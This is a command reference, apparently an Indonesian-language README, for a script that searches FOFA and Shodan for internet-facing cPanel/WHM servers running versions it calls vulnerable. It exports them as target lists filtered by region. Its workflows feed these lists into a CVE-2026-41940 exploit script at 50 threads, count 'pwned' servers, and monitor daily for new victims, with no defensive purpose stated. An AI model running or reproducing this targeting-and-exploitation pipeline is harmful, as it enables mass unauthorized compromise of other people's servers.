# 📋 DORK GENERATOR API - COMMAND REFERENCE

**Script:** dork-generator-api.py
**Purpose:** Auto-search FOFA/Shodan dan extract hasil langsung ke file
**Type:** CLI Tool dengan API integration

---

## 🚀 QUICK START

### Requirement:

```
1. API Key dari FOFA atau Shodan (WAJIB!)
2. Python 3.6+ dengan requests library

Install requests:
pip install requests
```

---

### Cara Mendapat API Key:

**FOFA:**
1. Go to https://fofa.info
2. Register account
3. Go to Settings → API Key
4. Copy email + API key

**Shodan:**
1. Go to https://shodan.io
2. Register account
3. Go to Account → API
4. Copy API key

---

## 📌 SETUP AWAL

### Setup API Credentials:

```bash
# Set environment variables (OPTIONAL)
export FOFA_EMAIL="your@email.com"
export FOFA_KEY="your_fofa_api_key"
export SHODAN_KEY="your_shodan_api_key"

# Or pass as arguments (lebih simple)
```

---

## 🎯 ALL COMMANDS

### COMMAND 1: List Semua Vulnerable Versions

**Syntax:**
```bash
python3 dork-generator-api.py --list
```

**Output:**
```
VULNERABLE cPanel VERSIONS

  1. 11.110
  2. 11.118
  3. 11.126
  4. 11.132
  5. 11.134
  6. 11.136
  7. 12.0.0
  8. 12.1.0
```

**Kegunaan:** Lihat semua version yang bisa di-search

---

### COMMAND 2: Search Single Version (FOFA)

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform fofa \
  --email your@email.com \
  --key YOUR_FOFA_API_KEY \
  --version 11.126.0
```

**Short version:**
```bash
python3 dork-generator-api.py -p fofa -e your@email.com -k YOUR_KEY -v 11.126.0
```

**Output:**
```
Generated dork:
port="2087" && banner="cPanel/11.126.0" && title="WHM Login" && !(http.status="401")

[*] Searching FOFA untuk: port="2087" && banner="cPanel/11.126.0"...
[+] Page 1: 10000 servers (Total: 10000)
[+] Page 2: 5421 servers (Total: 15421)
[+] Reached end at page 3

[+] FOFA search complete! Total: 15421 servers

╔════════════════════════════════════════╗
║     SEARCH RESULTS STATISTICS           ║
╠════════════════════════════════════════╣
║ Platform:     FOFA                      ║
║ Total found:  15421                     ║
║ Status:       Ready for exploit        ║
╚════════════════════════════════════════╝
```

**Kegunaan:** Search 1 version di FOFA, display results

---

### COMMAND 3: Search & Save to File

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform fofa \
  --email your@email.com \
  --key YOUR_KEY \
  --version 11.126.0 \
  --output targets.txt
```

**Output file (targets.txt):**
```
https://123.45.67.89:2087
https://124.56.78.90:2087
https://125.67.89.91:2087
https://126.78.90.92:2087
https://127.89.91.93:2087
...
https://223.255.255.254:2087
https://224.10.20.30:2087
```

**Kegunaan:** Save results ke file untuk dipakai exploit

---

### COMMAND 4: Search dengan Region Filter

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform fofa \
  --key YOUR_KEY \
  --email your@email.com \
  --version 11.126.0 \
  --region Asia \
  --output asia-targets.txt
```

**Output:** Hanya results dari Asia region

**Kegunaan:** Target spesifik region untuk efisiensi

---

### COMMAND 5: Search Semua Vulnerable Versions

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform fofa \
  --email your@email.com \
  --key YOUR_KEY \
  --search-all \
  --output all-servers.txt
```

**What it does:**
```
1. Auto-generate dorks untuk semua 8 versions
2. Search setiap version di FOFA
3. Combine semua results
4. Deduplicate
5. Save ke all-servers.txt
```

**Output stats:**
```
Searching 11.110...   [+] Found 5,000 servers
Searching 11.118...   [+] Found 8,500 servers
Searching 11.126...   [+] Found 15,421 servers
Searching 11.132...   [+] Found 3,200 servers
Searching 11.134...   [+] Found 2,100 servers
Searching 11.136...   [+] Found 800 servers
Searching 12.0.0...   [+] Found 1,500 servers
Searching 12.1.0...   [+] Found 2,400 servers

Total before dedup: 38,921 servers
Total after dedup:  38,652 servers (removed 269 duplicates)
```

**Kegunaan:** Bulk search semua versions sekaligus

---

### COMMAND 6: Search with Shodan

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform shodan \
  --key YOUR_SHODAN_KEY \
  --version 11.126.0 \
  --output shodan-targets.txt
```

**Kegunaan:** Cross-validate dengan Shodan database (different results)

---

### COMMAND 7: Batch Search dari File

**Buat file (dorks.txt):**
```
port="2087" && banner="cPanel/11.126.0"
port="2087" && banner="cPanel/11.118.0"
port="2087" && banner="cPanel/11.110.0"
```

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform fofa \
  --key YOUR_KEY \
  --email your@email.com \
  --batch-file dorks.txt \
  --output batch-results.txt
```

**Kegunaan:** Search banyak dorks sekaligus dari file

---

### COMMAND 8: Export as JSON

**Syntax:**
```bash
python3 dork-generator-api.py \
  --platform fofa \
  --key YOUR_KEY \
  --email your@email.com \
  --version 11.126.0 \
  --json \
  --output results.json
```

**Output file (results.json):**
```json
{
  "timestamp": "2026-07-25T10:30:00.000000",
  "platform": "fofa",
  "total": 15421,
  "servers": [
    "https://123.45.67.89:2087",
    "https://124.56.78.90:2087",
    "https://125.67.89.91:2087",
    ...
  ]
}
```

**Kegunaan:** Export untuk import ke tools lain

---

## 📚 COMMAND COMBINATIONS

### Combo 1: Full Workflow

```bash
# Step 1: Search semua versions di Asia
python3 dork-generator-api.py \
  --platform fofa \
  --email your@email.com \
  --key YOUR_KEY \
  --search-all \
  --region Asia \
  --output all-asia-targets.txt

# Step 2: Run exploit
python3 POC_CVE-2026-41940.py -l all-asia-targets.txt -t 50 -o results.json

# Step 3: Check results
cat results.json | jq '.[] | select(.vuln==true)' | wc -l
```

---

### Combo 2: Multi-Platform Cross-Validation

```bash
# Search di FOFA
python3 dork-generator-api.py -p fofa -e your@email.com -k FOFA_KEY -v 11.126.0 -o fofa-results.txt

# Search di Shodan
python3 dork-generator-api.py -p shodan -k SHODAN_KEY -v 11.126.0 -o shodan-results.txt

# Compare results
echo "FOFA results: $(wc -l < fofa-results.txt)"
echo "Shodan results: $(wc -l < shodan-results.txt)"

# Merge dan deduplicate
cat fofa-results.txt shodan-results.txt | sort -u > merged-targets.txt
```

---

### Combo 3: Regional Targeting

```bash
# Target specific regions
for region in "Asia" "Europe" "Indonesia"; do
  echo "[*] Searching $region..."
  python3 dork-generator-api.py \
    -p fofa \
    -e your@email.com \
    -k YOUR_KEY \
    -v 11.126.0 \
    -r "$region" \
    -o targets-$region.txt
done

# Merge all
cat targets-*.txt > all-regional-targets.txt
```

---

### Combo 4: Continuous Monitoring

```bash
#!/bin/bash
# Run daily search untuk new vulnerable servers

DATE=$(date +%Y%m%d)
python3 dork-generator-api.py \
  -p fofa \
  -e your@email.com \
  -k YOUR_KEY \
  --search-all \
  -o targets-$DATE.txt

# Check if new servers found
NEW_COUNT=$(wc -l < targets-$DATE.txt)
OLD_COUNT=$(wc -l < targets-$(date -d yesterday +%Y%m%d).txt 2>/dev/null || echo 0)

if [ $NEW_COUNT -gt $OLD_COUNT ]; then
  echo "[!] Found $((NEW_COUNT - OLD_COUNT)) new servers!"
fi
```

---

## 🔧 PARAMETER DETAILS

### --platform (REQUIRED jika tidak --list)

```
Values: fofa, shodan
Default: fofa

fofa   = FOFA (most accurate)
shodan = Shodan (good coverage)
```

---

### --email (REQUIRED untuk FOFA)

```
Format: your@email.com
Note: Required ketika --platform fofa
```

---

### --key (REQUIRED kecuali --list)

```
Format: YOUR_API_KEY
Note: FOFA API key atau Shodan API key (sesuai platform)
```

---

### --version

```
Format: 11.126.0 (without "cPanel/" prefix)
Options: 11.110, 11.118, 11.126, 11.132, 11.134, 11.136, 12.0.0, 12.1.0
```

---

### --region (OPTIONAL)

```
Format: "Asia", "Europe", "North America", "Indonesia"
Note: Only untuk FOFA
```

---

### --org (OPTIONAL)

```
Format: "hosting provider", "company name"
Note: Only untuk FOFA
```

---

### --output

```
Format: filename.txt atau filename.json
Note: Jika tidak specified, results hanya print to terminal
```

---

### --json

```
Flag untuk export as JSON
Usage: --json --output results.json
```

---

### --search-all

```
Flag untuk search semua vulnerable versions
Usage: --search-all --output all-results.txt
```

---

### --batch-file

```
Format: filename.txt (satu dork per line)
Usage: --batch-file dorks.txt --output results.txt
```

---

## 📊 OUTPUT FORMATS

### Format 1: TXT (Default)

```
# targets.txt
https://123.45.67.89:2087
https://124.56.78.90:2087
https://125.67.89.91:2087
```

**Kegunaan:** Direct input untuk POC_CVE-2026-41940.py

---

### Format 2: JSON

```json
{
  "timestamp": "2026-07-25T10:30:00",
  "platform": "fofa",
  "total": 15421,
  "servers": [...]
}
```

**Kegunaan:** Integration dengan tools lain

---

## ⚙️ ADVANCED USAGE

### Quick Alias

```bash
# Add ke ~/.bashrc atau ~/.zshrc
alias dorksearch='python3 dork-generator-api.py'

# Gunakan:
dorksearch -p fofa -e your@email.com -k KEY -v 11.126.0 -o targets.txt
```

---

### With Timeout

```bash
timeout 300 python3 dork-generator-api.py \
  -p fofa \
  -e your@email.com \
  -k YOUR_KEY \
  --search-all \
  -o results.txt
```

---

### Logging

```bash
python3 dork-generator-api.py \
  -p fofa \
  -e your@email.com \
  -k YOUR_KEY \
  -v 11.126.0 \
  -o targets.txt \
  2>&1 | tee search.log
```

---

## ⚠️ LIMITATIONS & TIPS

### Rate Limits:

```
FOFA: 10,000 API calls/day (paid tier)
Shodan: 500k queries/month (paid tier)

Tip: Use --region filter untuk reduce results
```

---

### Max Results per Dork:

```
FOFA: 10,000 per page × 100 pages = 1,000,000 max
Shodan: 5,000 per query max

Tip: Use specific filters untuk better results
```

---

### Timeout:

```
Default: 30 seconds per request
Problem: Large result set may timeout
Solution: Use --region filter untuk reduce volume
```

---

## 🎯 RECOMMENDED WORKFLOW

```
Step 1: List versions
python3 dork-generator-api.py --list

Step 2: Search most common version first (11.126.0)
python3 dork-generator-api.py -p fofa -e your@email.com -k KEY -v 11.126.0 -o 11126-targets.txt

Step 3: If successful, search all versions
python3 dork-generator-api.py -p fofa -e your@email.com -k KEY --search-all -o all-targets.txt

Step 4: Run exploit
python3 POC_CVE-2026-41940.py -l all-targets.txt -t 50 -o pwned.json

Step 5: Check results
echo "[+] Pwned servers: $(grep '"vuln": true' pwned.json | wc -l)"
```

---

## 💡 TROUBLESHOOTING

### Problem: "Error: Need FOFA email dan API key!"

**Solution:**
```bash
# Make sure you provide both email and key
python3 dork-generator-api.py -p fofa -e your@email.com -k YOUR_KEY -v 11.126.0
```

---

### Problem: "Rate limited! Waiting 60 seconds..."

**Solution:**
- Wait atau upgrade FOFA account
- Use --region filter untuk reduce volume

---

### Problem: No results found

**Solution:**
- Verify API key is correct
- Check dork syntax
- Try different version
- Try different platform (FOFA vs Shodan)

---

## ✅ SUMMARY OF ALL COMMANDS

| Command | Purpose | Syntax |
|---------|---------|--------|
| List versions | Show vulnerable versions | `--list` |
| Single search | Search 1 version | `-v 11.126.0` |
| Save results | Export to file | `-o targets.txt` |
| Region filter | Target specific region | `-r Asia` |
| Search all | Bulk search all versions | `--search-all` |
| Shodan search | Use Shodan API | `-p shodan` |
| Batch search | Search dari file | `--batch-file dorks.txt` |
| JSON export | Export as JSON | `--json` |

---

**Script siap digunakan!** 🚀

Semua command sudah lengkap dan siap pakai! 👉
# DORK-GENERATOR-VERSION-CPANEL
command untuk generator dork version cpanel 11.x vulnerable pada webseit. dengan pencarian khusus melalui fofa atau shodan dan dapat langsung IP:port yang vuln
